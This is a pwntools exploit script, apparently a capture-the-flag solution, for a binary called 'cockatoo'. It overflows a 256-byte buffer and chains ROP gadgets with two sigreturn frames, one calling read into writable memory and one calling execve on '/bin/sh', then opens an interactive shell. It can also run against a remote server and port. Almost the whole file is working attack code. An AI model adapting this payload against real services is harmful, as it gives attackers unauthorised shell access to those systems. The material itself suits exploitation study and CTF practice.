from pwn import *
from time import sleep


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

def logbase(): log.info("libc base = %#x" % libc.address)
def logleak(name, val):  log.info(name+" = %#x" % val)
def sa(delim,data): return io.sendafter(delim,data)
def sla(delim,line): return io.sendlineafter(delim,line)
def sl(line): return io.sendline(line)


def one_gadget(filename, base_addr=0):
  return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', '-l1', filename]).decode().split(' ')]


# Specify GDB script here (breakpoints etc)
gdbscript = '''
b *0x401189
b *0x4011c8
b *0x4011eb
continue
'''.format(**locals())

context.terminal = ['tmux','splitw','-h']
# Binary filename
exe = './cockatoo'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Lib-C library, can use pwninit/patchelf to patch binary
# libc = ELF("./libc.so.6")
# ld = ELF("./ld-2.27.so")


# Start program
io = start()

# Build the payload

syscall_ret = 0x401a8b
read = 0x401000
writable = 0x403100

frame = SigreturnFrame(kernel="amd64")
frame.rax = 0x0     
frame.rdi = 0x0
frame.rsi = writable
frame.rdx = 0x4000   
frame.rsp = writable 
frame.rip = syscall_ret


frame2 = SigreturnFrame(kernel="amd64")
frame2.rax = 0x3b     
frame2.rdi = 0x403218
frame2.rsi = 0
frame2.rdx = 0x0    

frame2.rip = syscall_ret


main = 0x401209
pop_rdi = 0x401001
payload = flat(
        pop_rdi,
        p64(0xf),
        syscall_ret,
        bytes(frame),
)

payload2 = flat(
        pop_rdi,
        p64(0xf),
        syscall_ret,
        bytes(frame2),
)

payload2 = flat(
        pop_rdi,
        p64(0xf),
        syscall_ret,
        bytes(frame2),

)
t = b"A"*256+b"\x17"
sl(t+payload+b"\x41")
#input("test ")
sl(payload2+p64(0)+b'/bin/sh\x00')


# Got Shell?
io.interactive()